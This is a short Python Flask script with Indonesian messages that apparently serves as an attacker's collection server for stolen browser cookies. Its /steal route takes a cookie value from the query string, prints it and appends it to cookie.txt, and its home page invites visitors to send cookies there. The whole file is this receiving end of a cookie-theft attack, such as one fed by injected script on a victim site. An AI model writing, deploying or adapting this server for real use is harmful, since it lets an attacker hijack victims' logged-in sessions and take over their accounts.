from flask import Flask, request

app = Flask(__name__)

@app.route("/", methods=["GET"])
def home():
    return "Server berjalan. Gunakan /steal untuk mengirim cookie!."

@app.route("/steal", methods=["GET"])
def steal():
    cookie = request.args.get("cookie")
    print(f"COokie yang diterima: {cookie}")

    with open("cookie.txt", "a") as file:
        file.write(cookie + "\n")

    return "Cookie berhasil diterima!"

if __name__ == "__main__":
    app.run(debug=True)
